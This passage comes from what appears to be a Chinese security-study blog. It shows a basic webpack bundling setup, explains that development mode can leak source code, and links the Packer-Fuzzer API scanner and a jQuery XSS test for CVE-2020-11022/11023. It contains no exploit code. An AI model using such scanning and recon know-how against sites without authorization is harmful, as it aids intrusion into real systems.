<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">count</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> x-y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>在src目录下创建与js同级main.js</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> count <span class="keyword">from</span> <span class="string">&quot;./js/count&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> sum <span class="keyword">from</span> <span class="string">&quot;./js/sum&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">sum</span>(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">count</span>(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>在创建src同级文件index.html</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    //./dist/bundle.js继续后看</span><br><span class="line">    &lt;script src=&quot;./dist/bundle.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>2、安装webpack库</strong></p>
<p>npm i webpack webpack-cli -g</p>
<p><img src="/img/xiaodi/image-20250518192250925-1747567378453-17.png" alt="image-20250518192250925"></p>
<p><strong>3、创建webpack配置文件</strong></p>
<ul>
<li>创建src同级文件<code>webpack.config.js</code>不能改名称</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入path模块，用于处理文件路径</span></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Webpack配置对象</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="comment">// 指定入口文件，即Webpack从这个文件开始构建依赖图</span></span><br><span class="line">    <span class="attr">entry</span>: <span class="string">&#x27;./src/main.js&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指定输出配置</span></span><br><span class="line">    <span class="attr">output</span>: &#123;</span><br><span class="line">        <span class="comment">// 输出的文件路径，使用path.resolve确保路径的正确性</span></span><br><span class="line">        <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;dist&#x27;</span>),</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出的文件名</span></span><br><span class="line">        <span class="attr">filename</span>: <span class="string">&#x27;bundle.js&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在每次构建前清理输出目录</span></span><br><span class="line">        <span class="attr">clean</span>: <span class="literal">true</span>,</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指定打包模式，可以是 &#x27;development&#x27; 或 &#x27;production&#x27;</span></span><br><span class="line">    <span class="attr">mode</span>: <span class="string">&quot;development&quot;</span>, <span class="comment">// 或者 &quot;production&quot;</span></span><br><span class="line">    <span class="comment">//mode:&quot;production&quot;,</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>4、运行webpack打包命令</strong></p>
<p>npx webpack</p>
<p><img src="/img/xiaodi/0d92993db46b338a6db5f61279d9300d.png" alt="Untitled"></p>
<ul>
<li>打包成功后，在index.html中将引用的代码切换为打包好的<code>./dist/bundle.</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script src=&quot;./dist/bundle.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>运行成功，并回显定义的两个函数计算结果</li>
<li><img src="/img/xiaodi/image-20250518192934091-1747567775515-21.png" alt="image-20250518192934091"></li>
</ul>
<h4 id="webpack安全"><a href="#webpack安全" class="headerlink" title="webpack安全"></a>webpack安全</h4><h4 id="1、WebPack源码泄漏-模式选择"><a href="#1、WebPack源码泄漏-模式选择" class="headerlink" title="1、WebPack源码泄漏-模式选择"></a>1、WebPack源码泄漏-模式选择</h4><ul>
<li><strong><code>development</code></strong> 模式下会启用一些开发工具，<strong>容易造成源码泄露</strong></li>
<li><strong><code>production</code></strong> 模式下会进行代码优化，<strong>代码极简化</strong>。</li>
</ul>
<p>使用development：</p>
<img src="/img/xiaodi/65890e09dc5597e2ab2953a2d3d54f1e.png" alt="Untitled" style="zoom:50%;" />

<p>使用production：</p>
<img src="/img/xiaodi/93848838d744f60988804c18d014b04a.png" alt="Untitled" style="zoom:50%;" />

<h4 id="模糊提取安全检查-PacketFuzzer"><a href="#模糊提取安全检查-PacketFuzzer" class="headerlink" title="模糊提取安全检查-PacketFuzzer"></a>模糊提取安全检查-PacketFuzzer</h4><p><a target="_blank" rel="noopener" href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a></p>
<blockquote>
<p>原生态JS：前端语言直接浏览器显示源代码<br>NodeJS：服务段语言浏览器不显示源代码<br>WebPack：打包模式选择开发者模式后会造成源码泄漏（nodejs vue）</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/b59e767d8c2196ed82b1450b37f99044.png" alt="Untitled"></p>
<p>本工具支持自动模糊提取对应目标站点的API以及API对应的参数内容，并支持对：未授权访问、敏感信息泄露、CORS、SQL注入、水平越权、弱口令、任意文件上传七大漏洞进行模糊高效的快速检测。在扫描结束之后，本工具还支持自动生成扫描报告，您可以选择便于分析的HTML版本以及较为正规的doc、pdf、txt版本。</p>
</blockquote>
<h3 id="JQuery-使用-安全"><a href="#JQuery-使用-安全" class="headerlink" title="JQuery-使用&amp;安全"></a>JQuery-使用&amp;安全</h3><p>jQuery是一个快速、简洁的JavaScript框架,是一个丰富的JavaScript代码库。设计目的是为了写更少的代码，做更多的事情。它封装JavaScript常用功能代码，提供一种简便的JavaScript设计模式，优化HTML文档操作、事件处理、动画设计和Ajax交互。</p>
<h4 id="1、使用："><a href="#1、使用：" class="headerlink" title="1、使用："></a>1、使用：</h4><p>引用路径：<a target="_blank" rel="noopener" href="https://www.jq22.com/jquery-info122">https://www.jq22.com/jquery-info122</a></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/b8c6d9e72bbaae7894b3f5727fb93ec7.png" alt="Untitled"></p>
<p>2、安全：<br>检测：<a target="_blank" rel="noopener" href="http://research.insecurelabs.org/jquery/test/">http://research.insecurelabs.org/jquery/test/</a><br>测试：CVE-2020-11022&#x2F;CVE-2020-11023<br>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44309905/article/details/120902867">https://blog.csdn.net/weixin_44309905/article/details/120902867</a></p>
<p><img src="/img/xiaodi/d7dd9fac1bcc5d23bb6099e03d47b4b2.png" alt="Untitled"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://www.geekgold.xyz">GoldY</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://www.geekgold.xyz/posts/b4ffc751.html">https://www.geekgold.xyz/posts/b4ffc751.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://www.geekgold.xyz" target="_blank">GoldY</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/">小迪安全</a></div><div class="post-share"><div class="social-share" data-image="/img/xiao_f.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/zhifubao.jpg" target="_blank"><img class="post-qr-code-img" src="/img/zhifubao.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/dba72746.html" title="小迪安全--信息打点(2)"><img class="cover" src="/img/xiao_f.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">小迪安全--信息打点(2)</div></div><div class="info-2"><div class="info-item-1">业务资产查询平台：    小蓝本 https://www.xiaolanben.com/    爱企查 https://aiqicha.baidu.com/   业务类型 WEB 应用 2. APP 应用 3. PC 端应用 4. 小程序应用 5. 微信公众号 6. 其他产品等 Web应用工具大全 [~]#棱角 ::Edge.Forum 主要资产内容  WEB 应用 2. APP 应用 3. PC 端应用 4. 小程序应用 5. 微信公众号 6....</div></div></div></a><a class="pagination-related" href="/posts/1288cce5.html" title="小迪安全--安全开发下篇(4)"><img class="cover" src="/img/xiao_f.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">小迪安全--安全开发下篇(4)</div></div><div class="info-2"><div class="info-item-1">JavaEE应用&amp;Servlet路由技术&amp;JDBC&amp;Mybatis数据库&amp;生命周期创建JavaEE项目1、使用idea创建javaee       运行测试：  JavaEE-HTTP-Servlet&amp;路由&amp;周期JAVAEE的核心-Servlet_javaee的核心 csdn-CSDN博客 Servlet介绍Servlet是运行在Web服务器或应用服务器上的程序,它是作为来自Web浏览器或其他HTTP客户端的请求和HTTP服务器上的数据库或应用程序之间的中间层。使用Servlet可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。本章内容详细讲解了web开发的相关内容以及servlet相关内容的配置使用,是JAVAEE开发的重中之重。 创建配置Servlet目录结构：   1、创建一个类集成HttpServlet 创建web.xml配置Servlet路由 1234567891011121314151617181920&lt;?xml version=&quot;1.0&quot;...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/e1dc7286.html" title="小迪安全--基础讲解(1)"><img class="cover" src="/img/xiao_f.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-12</div><div class="info-item-2">小迪安全--基础讲解(1)</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/posts/dba72746.html" title="小迪安全--信息打点(2)"><img class="cover" src="/img/xiao_f.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-18</div><div class="info-item-2">小迪安全--信息打点(2)</div></div><div class="info-2"><div class="info-item-1">业务资产查询平台：    小蓝本 https://www.xiaolanben.com/    爱企查 https://aiqicha.baidu.com/   业务类型 WEB 应用 2. APP 应用 3. PC 端应用 4. 小程序应用 5. 微信公众号 6. 其他产品等 Web应用工具大全 [~]#棱角 ::Edge.Forum 主要资产内容  WEB 应用 2. APP 应用 3. PC 端应用 4. 小程序应用 5. 微信公众号 6....</div></div></div></a><a class="pagination-related" href="/posts/1288cce5.html" title="小迪安全--安全开发下篇(4)"><img class="cover" src="/img/xiao_f.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-12</div><div class="info-item-2">小迪安全--安全开发下篇(4)</div></div><div class="info-2"><div class="info-item-1">JavaEE应用&amp;Servlet路由技术&amp;JDBC&amp;Mybatis数据库&amp;生命周期创建JavaEE项目1、使用idea创建javaee       运行测试：  JavaEE-HTTP-Servlet&amp;路由&amp;周期JAVAEE的核心-Servlet_javaee的核心 csdn-CSDN博客 Servlet介绍Servlet是运行在Web服务器或应用服务器上的程序,它是作为来自Web浏览器或其他HTTP客户端的请求和HTTP服务器上的数据库或应用程序之间的中间层。使用Servlet可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。本章内容详细讲解了web开发的相关内容以及servlet相关内容的配置使用,是JAVAEE开发的重中之重。 创建配置Servlet目录结构：   1、创建一个类集成HttpServlet 创建web.xml配置Servlet路由 1234567891011121314151617181920&lt;?xml version=&quot;1.0&quot;...</div></div></div></a><a class="pagination-related" href="/posts/3b40f62a.html" title="老男孩--信息收集(1)"><img class="cover" src="/img/oldboy.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-12</div><div class="info-item-2">老男孩--信息收集(1)</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/posts/e33055a4.html" title="老男孩--手机端信息收集及渗透(3)"><img class="cover" src="/img/oldboy.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-12</div><div class="info-item-2">老男孩--手机端信息收集及渗透(3)</div></div><div class="info-2"><div class="info-item-1">——–APP———-APP资产收集APP中含有连接服务器的相关域名、IP等信息，通过相关工具即可实现提取 AppInfoScanner项目地址：kelvinBen&#x2F;AppInfoScanner 一款适用于以HW行动&#x2F;红队&#x2F;渗透测试团队为场景的移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态WEB站点中关键的资产信息并提供基本的信息输出,如：Title、Domain、CDN、指纹信息、状态信息等。 使用配置： 12cd AppInfoScannerpython -m pip install -r requirements.txt    运行方法： 12345678#扫描Android应用的APK文件、DEX文件、需要下载的APK文件下载地址、保存需要扫描的文件的目录python app.py android -i &lt;Your APK File or DEX File or APK Download Url or Save File...</div></div></div></a><a class="pagination-related" href="/posts/f7a7b84b.html" title="老男孩--DDOS攻击与防御(4)"><img class="cover" src="/img/oldboy.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-12</div><div class="info-item-2">老男孩--DDOS攻击与防御(4)</div></div><div class="info-2"><div class="info-item-1">基础知识本教程仅在合法授权的情况下进行测试和研究，请勿用于其他用途。未经授权使用此类工具可能会侵犯他人隐私，触犯相关法律，任何因此引发的法律或利益纠纷与本人无关。 DDOS介绍DOS攻击：指的是采取一对一的方式，攻击目标服务器，使攻击目标CPU使用率提高，网络可以带宽减少等方式耗尽服务器的资源 DDOS攻击：攻击指借助于客户&#x2F;服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DoS攻击，从而成倍地提高拒绝服务攻击的威力。 被攻击时的现象：  被攻击的主机上有大量等待的TCP连接。 网络中充斥着大量的无用的数据包，源地址为假。 制造高流量无用数据，造成网络拥塞，使被攻击的主机无法正常通信。 利用受害主机提供的服务或传输协议上的缺陷，反复高速的发出特定的服务请求，使受害主机无法及时处理所有正常请求。 严重时会造成系统死机。  DDOS类型流量型攻击ICMP Flood攻击攻击介绍攻击原理：就是向目标发送大量的 ICMP Echo-Reply（type 0，code 0）或 Echo-Request（type...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/preview.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">GoldY</div><div class="author-info-description">不经一番寒彻骨，怎得梅花扑鼻香。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/yuwenjin666"><i class="fab fa-github"></i><span>Github主页</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">联系我V：GoldY_66</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP"><span class="toc-number">1.</span> <span class="toc-text">PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%A4%A9"><span class="toc-number">1.1.</span> <span class="toc-text">第一天</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85PHPStrom"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">安装PHPStrom</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEPHPStudy"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">配置PHPStudy</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5"><span class="toc-number">1.1.2.</span> <span class="toc-text">数据库操作-增删改查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E7%95%99%E8%A8%80%E6%9D%BF%E5%89%8D%E5%90%8E%E7%AB%AF%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.1.3.</span> <span class="toc-text">PHP留言板前后端功能实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML%E8%A1%A8%E5%8D%95%E9%83%A8%E5%88%86"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">HTML表单部分</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E9%83%A8%E5%88%86"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">PHP部分</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%92%8C%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">全局变量和函数调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E7%AC%AC%E4%B8%89%E6%96%B9%E6%8F%92%E4%BB%B6%E5%AE%9E%E7%8E%B0%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.1.3.4.</span> <span class="toc-text">添加第三方插件实现上传</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">1.1.4.</span> <span class="toc-text">源码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%A4%A9"><span class="toc-number">1.2.</span> <span class="toc-text">第二天</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie%E6%8A%80%E6%9C%AF"><span class="toc-number">1.2.1.</span> <span class="toc-text">Cookie技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAphp%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">创建php文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Session%E6%8A%80%E6%9C%AF"><span class="toc-number">1.2.2.</span> <span class="toc-text">Session技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAphp%E6%96%87%E4%BB%B6-1"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">创建php文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Token%E6%8A%80%E6%9C%AF"><span class="toc-number">1.2.3.</span> <span class="toc-text">Token技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAphp%E6%96%87%E4%BB%B6-2"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">创建php文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%A4%A9"><span class="toc-number">1.3.</span> <span class="toc-text">第三天</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86-%E6%98%BE%E7%A4%BA-%E4%B8%8A%E4%BC%A0%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.3.1.</span> <span class="toc-text">PHP文件管理-显示&amp;上传功能实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">文件上传功能实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E8%BF%87%E6%BB%A4%E6%9C%BA%E5%88%B6"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">黑名单过滤机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95%E8%BF%87%E6%BB%A4%E6%9C%BA%E5%88%B6"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">白名单过滤机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E8%BF%87%E6%BB%A4%E6%9C%BA%E5%88%B6"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">文件类型过滤机制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E6%A8%A1%E5%9D%97-%E6%98%BE%E7%A4%BA-%E8%BF%87%E6%BB%A4%E6%9C%BA%E5%88%B6"><span class="toc-number">1.3.2.</span> <span class="toc-text">文件管理模块-显示-过滤机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">功能实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP-INI%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">PHP.INI目录访问控制</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%A4%A9"><span class="toc-number">1.4.</span> <span class="toc-text">第四天</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.4.1.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.4.2.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%98%BE%E7%A4%BA"><span class="toc-number">1.4.3.</span> <span class="toc-text">文件显示</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">具体实现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4"><span class="toc-number">1.4.4.</span> <span class="toc-text">文件删除</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.4.5.</span> <span class="toc-text">文件下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91"><span class="toc-number">1.4.6.</span> <span class="toc-text">文件编辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81"><span class="toc-number">1.4.7.</span> <span class="toc-text">完整代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6"><span class="toc-number">1.4.8.</span> <span class="toc-text">防御机制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E5%A4%A9"><span class="toc-number">1.5.</span> <span class="toc-text">第五天</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E8%AF%BB%E5%8F%96%E6%98%BE%E7%A4%BA"><span class="toc-number">1.5.1.</span> <span class="toc-text">数据库操作读取显示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%A8%A1%E6%9D%BF%E5%BC%95%E7%94%A8"><span class="toc-number">1.5.2.</span> <span class="toc-text">实现模板引用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Smarty%E6%A8%A1%E7%89%88%E5%BC%95%E7%94%A8"><span class="toc-number">1.5.3.</span> <span class="toc-text">Smarty模版引用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Smarty3%E6%A8%A1%E7%89%88%E5%BC%95%E7%94%A8-%E6%9C%89%E5%AF%B9%E5%BA%94%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">Smarty3模版引用-有对应漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81RCE%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95"><span class="toc-number">1.5.4.</span> <span class="toc-text">代码RCE安全测试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E5%A4%A9"><span class="toc-number">1.6.</span> <span class="toc-text">第六天</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 